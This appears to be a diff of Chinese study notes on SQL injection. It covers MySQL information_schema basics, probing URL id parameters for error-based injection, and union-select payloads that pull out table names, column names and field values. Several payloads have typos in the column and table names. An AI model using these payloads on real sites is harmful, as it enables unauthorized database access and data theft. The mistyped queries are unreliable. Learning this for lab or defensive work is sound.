@@ -2,5 +2,37 @@ show databases;查询检查一下数据库
 选择information_schema来执行命令 use information_schema;
 查看一下这个数据库有哪些表 show tables;
 再枚举这个表 desc tables;
-SQL注入类型：数字和字符型 表中存在id字段的才可以使用，通过url中修改对应的id值为正常数字，大数字，字符（单双引号，双单引号，括号），反斜杠\探测url是否存在注入点
-1-4基于报错的sql注入
+sql注入的基础知识
+默认定义了information_schema数据库，存储数据库元信息，schemata(数据库名)，tables(表名),columns(列名或字段名)
+在schemata表中，schemata_name字段用来存储数据库名
+在table表中，table_schema和table_name分别用来存储数据库名和表名
+在columns表，table_schema(数据库名)，table_name(表名)，column_name(表名)
+select 列名称 from 表名称 where 字段1='条件1' and 字段2='条件2'
+insert into table name(列1，列2） values(值1，值2)
+update 表名称 set 列名称=新值 where 列名称=某值
+delete from 表名称 where 列名称=某值
+user():查看当前myswql登入用户名
+database():查看当前使用的数据库
+version():查看当前使用的版本
+limit n,m:=
+SQL注入类型：数字和字符型 表中存在id字段的才可以使用，通过url中修改对应的id值为正常数字，大数字，字符（单双引号，双单引号，括号），反斜杠\探测url是否存在注入点、
+数字型：select *from table where id=用户输入id
+字符型：select *from table where id='字符型'
+一：GET基于报错的SQL注入：通过url中修改对应的id值为正常数字，大数字，字符（单双引号，双单引号，括号），反斜杠\探测url是否存在注入点
+加？相当于直接默认到index.php上
+ ''14'' LIMIT 0,1' 中'14'' LIMIT 0,1
+ 推断基于单引号的报错：select  login_name,password from admin where id='id' limit 0,1
+  '' LIMIT 0,1' 中' LIMIT 0,1
+ 基于数字的报错：select  login_name,password from admin where id=id limit 0,1
+ ''1'') LIMIT 0,1'中'1'') LIMIT 0,1
+ 基于单引号括号之间的报错：select  login_name,password from admin where id=('id') limit 0,1
+ '"1\") LIMIT 0,1'中"1\") LIMIT 0,1
+ 基于双引号之间的报错：select  login_name,password from admin where id=("id") limit 0,1
+ 二：GET基于报错的sql注入利用
+ 1.利用order by判断字段数
+ 2.利用union select联合查询，获取表名：0'union select 1,group_concat(table_name),3 from information_schema.tables where table_schemata=database()--+
+ 3.利用union select联合查询，获取字段名：0'union select 1,group_concat(columns_name),3 from information_schema.tables where=table_schemata='users'--+
+ 4.利用union select联合查询，获取字段值：0'union select 1,group_concat(columns_name),3 from users--+
+ 
+ 
+
